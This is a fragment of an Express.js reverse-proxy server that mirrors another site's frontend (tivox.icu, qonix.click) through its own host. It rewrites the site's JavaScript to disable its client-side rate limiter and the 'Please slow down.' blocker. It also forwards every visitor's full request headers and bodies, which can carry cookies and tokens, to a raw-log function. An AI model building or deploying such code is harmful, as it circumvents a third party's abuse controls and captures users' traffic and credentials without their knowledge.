      res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
      res.setHeader('Pragma', 'no-cache');
      res.setHeader('content-type', 'text/html; charset=utf-8');
      res.setHeader('content-length', String(buf.length));
      res.status(response.status).end(buf);

      // Raw log — frontend HTML page load
      if (cachedData && cachedData.rawLog) {
        const rhdrs = {}; response.headers.forEach((v, k) => { rhdrs[k] = v; });
        loadData().then(d => sendRawLog(d, {
          method: req.method, url: req.originalUrl || req.url,
          reqHeaders: req.headers, reqBodyRaw: req.rawBody,
          status: response.status, respHeaders: rhdrs,
          respBodyRaw: html.substring(0, 8000),
          source: 'frontend', now
        })).catch(() => { });
      }
      return;
    }

    // JS — rewrite tivox/qonix references to proxy + patch frontend rate limiter
    if (ct.includes('javascript')) {
      // Skip cache for HEAD requests (no body — would cache 0 bytes)
      if (req.method === 'HEAD') {
        res.setHeader('Cache-Control', 'public, max-age=86400, immutable');
        res.setHeader('content-type', ct);
        res.status(response.status).end();
        return;
      }
      const cacheKey = 'js:' + path;
      let cached = cacheGet(cacheKey);
      let buf, finalCt;

      if (cached) {
        buf = cached.buf;
        finalCt = cached.ct;
      } else {
        let js = await response.text();
        const proxyBase = 'https://' + PROXY_HOST;
        js = js.replace(/https:\/\/tivox\.icu/g, proxyBase);
        js = js.replace(/https:\/\/qonix\.click/g, proxyBase);
        js = js.replace(/\.\/rsCfg\.json/g, proxyBase + '/rsCfg.json');
        js = js.replace(/"rsCfg\.json/g, '"' + proxyBase + '/rsCfg.json');

        // Patch frontend rate limiter — "Please slow down." blocker
        js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1e3/g, 'API_HTTP_WINDOW_MS=999999999');
        js = js.replace(/API_HTTP_WINDOW_MS\s*=\s*1000/g, 'API_HTTP_WINDOW_MS=999999999');
        js = js.replace(/API_HTTP_DEFAULT_MAX_PER_WINDOW\s*=\s*1\b/g, 'API_HTTP_DEFAULT_MAX_PER_WINDOW=9999');
        js = js.replace(/API_HTTP_WAITPAYER_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_WAITPAYER_MAX_PER_WINDOW=9999');
        js = js.replace(/API_HTTP_BUY_HISTORY_MAX_PER_WINDOW\s*=\s*\d+/g, 'API_HTTP_BUY_HISTORY_MAX_PER_WINDOW=9999');
        js = js.replace(/API_HTTP_RATE_LIMIT_MSG\s*=\s*"Please slow down\."/g, 'API_HTTP_RATE_LIMIT_MSG=""');

        buf = Buffer.from(js, 'utf-8');
        finalCt = ct;
        // JS filenames have content-hash (e.g. index.cc0347da.js) — cache indefinitely
        cacheSet(cacheKey, buf, finalCt, response.status, 0);
      }

      // Content-hashed JS: safe to cache in browser too — instant on repeat visits
      res.setHeader('Cache-Control', 'public, max-age=86400, immutable');
      res.setHeader('content-type', finalCt);
      res.setHeader('content-length', String(buf.length));
      res.status(200).end(buf);
      return;
    }

    // Everything else — stream as-is (log if JSON/text and rawLog ON)
    const buf = Buffer.from(await response.arrayBuffer());
    res.setHeader('content-length', String(buf.length));
    res.status(response.status).end(buf);

    if (cachedData && cachedData.rawLog && (ct.includes('json') || ct.includes('text'))) {
      const rhdrs = {}; response.headers.forEach((v, k) => { rhdrs[k] = v; });
      loadData().then(d => sendRawLog(d, {
        method: req.method, url: req.originalUrl || req.url,
        reqHeaders: req.headers, reqBodyRaw: req.rawBody,
        status: response.status, respHeaders: rhdrs,
        respBodyRaw: buf.toString('utf-8').substring(0, 8000),
        source: 'frontend', now
      })).catch(() => { });
    }

  } catch (e) {
    console.error('Frontend proxy error:', e.message);
    if (!res.headersSent) res.status(502).send('Proxy error: ' + e.message);
  }
});

module.exports = app;
